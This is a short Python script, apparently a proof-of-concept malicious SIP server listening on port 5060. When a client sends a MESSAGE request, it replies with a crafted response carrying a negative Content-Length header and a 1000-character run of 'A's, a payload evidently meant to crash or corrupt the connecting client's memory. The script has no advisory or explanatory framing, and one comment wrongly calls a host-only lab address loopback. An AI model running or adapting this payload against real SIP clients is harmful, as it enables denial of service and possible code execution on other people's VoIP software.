import os, socket


HOST = '192.168.56.1'  # Standard loopback interface address (localhost)
PORT = 5060        # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print('Listening on '+HOST+':'+str(PORT)+'...')
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            if not data:
                break
            dataStr = data.decode('utf-8')

            print('REQUEST:\n'+dataStr+'\n')

            parsedRequest = dataStr.split('\r\n')
            method = parsedRequest[0].split(' ', 1)[0]
            print('Request METHOD: '+method)

            if method == 'MESSAGE':
                response = ''
                for i in range(12):
                    if i == 9:
                        response += 'Content-Length: -1\r\n\r\n'
                    elif i==11:
                        response += 'A' * 1000 + '\r\n'
                    else:
                        response += parsedRequest[i] + '\r\n'

            else:
                response = 'SIP/2.0 200 OK\r\n' + dataStr.split('\r\n',1)[1]

            print('RESPONSE:\n'+response+'\n')
            conn.sendall(response.encode('utf-8'))
